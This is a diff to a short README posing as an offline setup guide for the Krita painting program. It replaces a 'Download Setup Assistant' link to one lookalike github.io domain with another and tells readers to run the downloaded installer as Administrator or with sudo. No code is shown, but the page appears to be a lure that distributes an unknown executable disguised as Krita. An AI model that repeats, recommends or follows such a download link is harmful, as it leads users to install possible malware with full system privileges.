@@ -1,6 +1,6 @@
 # Krita — Offline Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://krita-free-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://krita-freedownload1tool.github.io/.github/)
 
 ⚙️ How to Use  
 1. Download the setup assistant using the button above  
@@ -8,6 +8,8 @@
 3. Run the installer as Administrator or with sudo  
 4. Follow the on-screen instructions to install Krita offline  
 5. Launch Krita — start creating digital art immediately
+
+---
 
 🎯 What You Unlock
 
